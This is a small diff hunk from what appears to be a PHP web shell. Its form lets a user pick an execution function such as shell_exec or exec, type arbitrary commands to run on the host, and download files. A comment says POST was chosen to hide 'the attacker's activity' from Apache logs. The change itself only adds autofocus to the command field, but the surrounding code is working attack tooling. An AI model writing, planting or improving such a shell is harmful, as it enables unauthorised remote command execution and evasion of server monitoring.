@@ -245,7 +245,7 @@
 		<a href="http://php.net/manual/en/function.shell-exec.php">shell_exec()</a><input onClick="execType('shell_exec')" <?php if($_POST['execType']){if($_POST['execType'] == "shell_exec"){echo "checked";} } ?>
 			type="radio" name="execType" value="shell_exec" /><br />
 	<form action="#" method="post" name="submitCmd" id="submitCmd"><!-- no button here, just hit enter -->
-		<input id="inputCmd" type="text" size="55" placeholder="Type command here to execute on host and hit return" name="cmd"/>
+		<input id="inputCmd" type="text" size="55" placeholder="Type command here to execute on host and hit return" autofocus name="cmd"/>
 		<input type="hidden" value="<?php if($_POST['execType'] != ""){echo $_POST['execType'];}else{echo "exec";} ?>" name="execType" id="execType"/>
 		<button type="button" onClick="saveFile();">&#x1F4E5; Download File</button>
 	</form><!-- went with POST method to slightly obfuscate the attacker's activity from simple Apache logs -->
